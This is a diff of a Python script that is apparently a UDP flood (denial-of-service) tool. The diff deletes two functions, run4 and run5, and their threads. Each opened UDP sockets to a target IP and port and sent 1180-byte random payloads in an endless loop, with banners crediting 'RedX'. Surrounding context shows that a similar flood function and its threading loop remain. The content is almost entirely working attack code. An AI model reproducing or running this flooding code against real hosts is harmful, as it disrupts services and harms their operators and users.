@@ -66,35 +66,6 @@ def run3():
 		except:
 			s.close()
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
-def run4():
-        data = random._urandom(1180)
-        i = random.choice(("[•]","[•]","[•]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        s.connect((ip,port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
-		except:
-                        s.close()
-                        print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
-
-def run5():
-        data = random._urandom(1180)
-        i = random.choice(("[•]","[•]","[•]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        s.connect((ip,port))
-                        s.send(data)
-                        for x in range(times):
-                                s.send(data)
-                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
-		except:
-                        s.close()
-                        print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
 for y in range(threads):
 	if choice == 'y':
@@ -104,7 +75,3 @@ for y in range(threads):
 		th.start()
 		th = threading.Thread(target = run3)
 		th.start()
-                th = threading.Thread(target = run4)
-                th.start()
-                th = threading.Thread(target = run5)
-                th.start()
